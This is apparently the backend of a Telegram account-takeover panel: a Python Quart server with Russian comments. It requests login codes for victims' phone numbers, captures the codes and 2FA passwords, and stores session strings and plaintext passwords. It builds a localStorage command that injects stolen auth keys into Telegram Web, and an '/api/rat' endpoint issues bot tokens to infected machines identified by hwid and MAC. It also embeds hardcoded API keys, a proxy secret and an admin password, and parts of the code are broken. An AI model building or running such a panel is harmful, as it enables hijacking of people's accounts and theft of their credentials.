from telethon.errors import ApiIdInvalidError, AccessTokenInvalidError
import logging
from logging.handlers import RotatingFileHandler
from quart import Quart, request, jsonify, render_template, redirect
from telethon import TelegramClient, connection
from telethon.sessions import StringSession
import asyncio, telethon, subprocess, os, json
from collections import defaultdict
from threading import Lock
from functools import wraps
import jwt, random
import datetime
from jwt import ExpiredSignatureError, InvalidTokenError
from werkzeug.security import generate_password_hash, check_password_hash

# Настройка логирования
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        RotatingFileHandler('app.log', maxBytes=1024*1024*5, backupCount=5),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Quart(__name__)
app.secret_key = 'developer'

# Конфигурация
ram = defaultdict(dict)
running_processes = {}
process_lock = Lock()
proxy = ("87.229.100.237", 443, "79e462821249bd7ac519130220c25d09")
API_ID, API_HASH = 13529272, "061e06eb472e220e6639bb764000e195"

# Функции работы с пользователями
def load_users():
    if not os.path.exists("users.json"):
        default_users = {
            "devjeb": {
                "password": generate_password_hash("161107Dev"),
                "role": "admin"
            }
        }
        with open("users.json", "w") as f:
            json.dump(default_users, f, indent=4)
        return default_users
    with open("users.json", "r") as f:
        return json.load(f)

def save_users(users_data):
    with open("users.json", "w") as f:
        json.dump(users_data, f, indent=4)

# Функции работы с конфигурацией
def load_config():
    if not os.path.exists("config.json"):
        with open("config.json", "w") as f:
            json.dump({}, f, indent=4)
    with open("config.json", "r") as f:
        return json.load(f)

def save_config(config_data):
    with open("config.json", "w") as f:
        json.dump(config_data, f, indent=4)

async def starts_client(phone, current_user):
    config = load_config()
    users = load_users()
    
    if phone not in config:
        return jsonify({"status": "error", "message": "Phone not found"}), 404
    
    if not (users.get(current_user, {}).get('role') == 'admin' or config[phone].get('owner') == current_user):
        return jsonify({"status": "error", "message": "Forbidden"}), 403
    
    with process_lock:
        if phone in running_processes:
            return jsonify({"status": "error", "message": "Already running"}), 400
        
        try:
            #proc = subprocess.Popen(["python", "o.py", phone])
            #running_processes[phone] = proc
            #config[phone]["is_running"] = True
            #save_config(config)
            return jsonify({"status": "success", "message": "Client started"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500
def token_required(f):
    @wraps(f)
    async def decorated(*args, **kwargs):
        if request.path in ['/login', '/api/login']:
            return await f(*args, **kwargs)
            
        token = request.cookies.get('token')
        if not token:
            if request.path.startswith('/api/'):
                return jsonify({'success': False, 'message': 'Unauthorized'}), 401
            return redirect('/login')
        
        try:
            data = jwt.decode(token, app.secret_key, algorithms=["HS256"])
            kwargs["current_user"] = data["username"]
        except ExpiredSignatureError:
            if request.path.startswith('/api/'):
                return jsonify({'success': False, 'message': 'Token expired'}), 401
            
            return redirect('/login')
        except InvalidTokenError:
            if request.path.startswith('/api/'):
                return jsonify({'success': False, 'message': 'Invalid token'}), 401
            return redirect('/login')
        return await f(*args, **kwargs)
    return decorated

def admin_required(f):
    @wraps(f)
    async def decorated(*args, **kwargs):
        current_user = kwargs.get('current_user')
        users = load_users()
        if users.get(current_user, {}).get('role') != 'admin':
            if request.path.startswith('/api/'):
                return jsonify({'success': False, 'message': 'Forbidden'}), 403
            
            return redirect('/panel')
        return await f(*args, **kwargs)
    return decorated
@app.before_serving
async def startup():
    config = load_config()
    for i in config.keys():
        #await starts_client(i, "devjeb")
        config[i]["is_runnuing"] = False
    save_config(config)
# Роуты аутентификации
@app.route('/login', methods=['GET'])
async def login_page():
    return await render_template('login.html')

@app.route('/register')
@token_required
async def register_page(current_user):
    users = load_users()
    # Проверка роли прямо в функции
    if users.get(current_user, {}).get('role') != 'admin' and users.get(current_user, {}).get('role') != 'moder':
        return redirect('/panel')
    return await render_template('register.html')

@app.route('/api/register', methods=['POST'])
@token_required
async def register(current_user):
    users = load_users()
    
    # Проверка прав администратора
    if users.get(current_user, {}).get('role') != 'admin':
        return jsonify({'success': False, 'message': 'Forbidden'}), 403
    
    data = await request.get_json()
    
    if not data.get('username') or not data.get('password'):
        return jsonify({'success': False, 'message': 'Username and password required'}), 400
    
    if data['username'] in users:
        return jsonify({'success': False, 'message': 'User already exists'}), 400
    
    if len(data['password']) < 6:
        return jsonify({'success': False, 'message': 'Password too short (min 6 chars)'}), 400
    
    users[data['username']] = {
        "password": generate_password_hash(data['password']),
        "role": "user"
    }
    save_users(users)
    return jsonify({'success': True, 'message': 'User created successfully'})
@app.route('/api/rat', methods=['GET'])
async def rat():
    data = request.args
    print(data)
    hwid, mac, board = data.get('hwid'), data.get('mac'), data.get('board')
    with open("bot.json", "r") as f:
        datas = json.load(f)
    if hwid in datas:
        client = TelegramClient(StringSession, API_ID, API_HASH)
        try:
            await client.start(bot_token=bot_token)
            me = await client.get_me()
            datas[hwid]["run"] = False
        except (ApiIdInvalidError, AccessTokenInvalidError, ValueError) as e:
            datas[hwid]["run"] =True
        finally:
            await client.disconnect()
        if datas[hwid]["run"]:
            return jsonify({'success': False, 'message': 'You already have a bot'}), 400
        else:
            with open("bot.json", "w") as f:
                datas[hwid]["run"] = True
                json.dump(datas, f, ensure_ascii=False, indent=4)
            if "bot" in datas[hwid]:
                return jsonify({'success': True, 'message': 'success', "TOKEN": datas[hwid]["bot"]}), 200
    else:
        r = random.choice(datas["bot"])
        datas[hwid] = {"run":True,"bot":r}
        datas["bot"].remove(r)
        with open("bot.json", "w") as f:
            json.dump(datas, f, ensure_ascii=False, indent=4)
        return jsonify({'success': True, 'message': 'success', "TOKEN": r}), 200
            
@app.route('/api/login', methods=['POST'])
async def login():
    data = await request.get_json()
    users = load_users()
    user = users.get(data.get('username'))
    
    if not user or not check_password_hash(user['password'], data.get('password')):
        return jsonify({'success': False, 'message': 'Invalid credentials'}), 401
    
    token = jwt.encode({
        'username': data['username'],
        'exp': datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=24)
    }, app.secret_key)
    
    response = jsonify({'success': True})
    response.set_cookie('token', token, httponly=True)
    return response

@app.route('/api/logout', methods=['POST'])
@token_required
async def logout(current_user):
    response = jsonify({'success': True})
    response.delete_cookie('token')
    return response

# Основные роуты
@app.route('/')
@token_required
async def index(current_user):
    return await render_template("index.html", versions=random.randint(0,10))

@app.route('/panel')
@token_required
async def panel(current_user):
    users = load_users()
    config = load_config()
    is_admin = users.get(current_user, {}).get('role') == 'admin'
    
    phones = []
    for phone in config:
        if is_admin or config[phone].get('owner') == current_user:
            phones.append(phone)
    
    return await render_template(
        "panel.html",
        phones=phones,
        is_admin=is_admin, versions=random.randint(0,10)
    )

# Работа с Telegram
@app.route('/auth', methods=['POST'])
@token_required
async def auth(current_user):
    data = await request.get_json()
    phone = data.get("phone")
    
    if not phone:
        return jsonify({"status": "error", "message": "Phone required"}), 400
    
    phone = data.get("phone").replace(" ", "").replace("+", "")
    ram[phone] = StringSession()
    
    try:
        ram[f"client_{phone}"] = TelegramClient(
        ram[phone], 
        API_ID, 
        API_HASH, 
        device_model="devjeb", 
        app_version="777", 
        system_version="777",
        connection=connection.ConnectionTcpMTProxyRandomizedIntermediate,
        proxy=proxy
    )
        await ram[f"client_{phone}"].connect()
        await ram[f"client_{phone}"].send_code_request(phone)
        return jsonify({
            "status": "success",
            "message": "Code sent",
            "data": {"phone": phone}
        })
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 500

@app.route('/verify-code', methods=['POST'])
@token_required
async def verify_code(current_user):
    data = await request.get_json()
    phone = data.get("phone").replace(" ", "").replace("+", "")
    code = data.get('code')
    
    if not phone or not code:
        return jsonify({"status": "error", "message": "Phone and code required"}), 400
    
    phone = phone.replace(" ", "").replace("+", "")
    client = ram.get(f"client_{phone}")
    
    if not client:
        return jsonify({"status": "error", "message": "Session expired"}), 400
    
    try:
        await client.sign_in(phone, code=int(code))
        
        if await client.is_user_authorized():
            session_string = ram[phone].save()
            config = load_config()
            config[phone] = {
                "owner": current_user,
                "session": session_string,
                "id": (await client.get_me()).id
            }
            save_config(config)
            await client.disconnect()
            await starts_client(phone, current_user)
            return jsonify({
                "status": "success",
                "message": "Authorization successful",
                "session": session_string
            })
        else:
            return jsonify({
                "status": "error",
                "message": "Authorization failed"
            }), 400
    except telethon.errors.rpcerrorlist.SessionPasswordNeededError:
        return jsonify({
            "status": "password_required",
            "message": "2FA password required",
            "data": {"phone": phone}
        }), 400
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 400

@app.route('/verify-password', methods=['POST'])
@token_required
async def verify_password(current_user):
    data = await request.get_json()
    phone = data.get("phone").replace(" ", "").replace("+", "")
    password = data.get('password')
    
    if not phone or not password:
        return jsonify({"status": "error", "message": "Phone and password required"}), 400
    
    phone = phone.replace(" ", "").replace("+", "")
    client = ram.get(f"client_{phone}")
    
    if not client:
        return jsonify({"status": "error", "message": "Session expired"}), 400
    
    try:
        await client.sign_in(password=password)
        
        if await client.is_user_authorized():
            session_string = ram[phone].save()
            config = load_config()
            config[phone] = {
                "owner": current_user,
                "session": session_string,
                "id": (await client.get_me()).id,
                "password": password
            }
            save_config(config)
            await client.disconnect()
            await starts_client(str(phone), str(current_user))
            
            return jsonify({
                "status": "success",
                "message": "Authorization successful",
                "session": session_string
            })
        else:
            return jsonify({
                "status": "error",
                "message": "Invalid password"
            }), 400
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": str(e)
        }), 400

# Управление аккаунтами
@app.route('/panel/<phone>')
@token_required
async def phone_details(phone, current_user):
    config = load_config()
    users = load_users()
    
    if phone not in config:
        return redirect('/panel')
    
    if not (users.get(current_user, {}).get('role') == 'admin' or config[phone].get('owner') == current_user):
        return redirect('/panel')
    
    try:
        with open(f"list/{phone}.json", "r") as f:
            cfg = json.load(f)
    except:
        cfg = {"datas": [{"user_auth": {}, "dc1_auth_key": ""}]}
    
    details = {
        "phone": phone,
        "session": config[phone].get("session", ""),
        "id": config[phone].get("id", ""),
        "has_password": "password" in config[phone],
        "is_active": config[phone].get("is_running", False),
        "command": f"""localStorage.clear();localStorage.setItem(\"user_auth\", \""""+ json.dumps(cfg['datas'][0]['user_auth']).replace('\"', '\\\"')+"""\");localStorage.setItem(\"dc"""+cfg['datas'][0]['user_auth'].get('dcID', 1)+"""_auth_key\", \"\\\""""+cfg['datas'][0].get('dc' + cfg['datas'][0]['user_auth'].get('dcID', 1)+'_auth_key', '').replace('\"', '\\\"')+"""\\\"\");location.reload()"""
    }
    
    return await render_template("phone_details.html", details=details, versions=random.randint(0,10))

@app.route('/panel/<phone>/start', methods=['POST'])
@token_required
async def start_client(phone, current_user):
    config = load_config()
    users = load_users()
    
    if phone not in config:
        return jsonify({"status": "error", "message": "Phone not found"}), 404
    
    if not (users.get(current_user, {}).get('role') == 'admin' or config[phone].get('owner') == current_user):
        return jsonify({"status": "error", "message": "Forbidden"}), 403
    
    with process_lock:
        if phone in running_processes:
            return jsonify({"status": "error", "message": "Already running"}), 400
        
        try:
            proc = subprocess.Popen(["python", "o.py", phone])
            running_processes[phone] = proc
            config[phone]["is_running"] = True
            save_config(config)
            return jsonify({"status": "success", "message": "Client started"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/panel/<phone>/stop', methods=['POST'])
@token_required
async def stop_client(phone, current_user):
    config = load_config()
    users = load_users()
    
    if phone not in config:
        return jsonify({"status": "error", "message": "Phone not found"}), 404
    
    if not (users.get(current_user, {}).get('role') == 'admin' or config[phone].get('owner') == current_user):
        return jsonify({"status": "error", "message": "Forbidden"}), 403
    
    with process_lock:
        if phone not in running_processes:
            return jsonify({"status": "error", "message": "Not running"}), 400
        
        try:
            proc = running_processes[phone]
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except:
                proc.kill()
            
            del running_processes[phone]
            config[phone]["is_running"] = False
            save_config(config)
            return jsonify({"status": "success", "message": "Client stopped"})
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/panel/<phone>/delete', methods=['POST'])
@token_required
async def delete_phone(phone, current_user):
    config = load_config()
    users = load_users()
    
    if phone not in config:
        return jsonify({"status": "error", "message": "Phone not found"}), 404
    
    if not (users.get(current_user, {}).get('role') == 'admin' or config[phone].get('owner') == current_user):
        return jsonify({"status": "error", "message": "Forbidden"}), 403
    
    with process_lock:
        if phone in running_processes:
            proc = running_processes[phone]
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except:
                proc.kill()
            del running_processes[phone]
        
        del config[phone]
        save_config(config)
        return jsonify({"status": "success", "message": "Account deleted"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
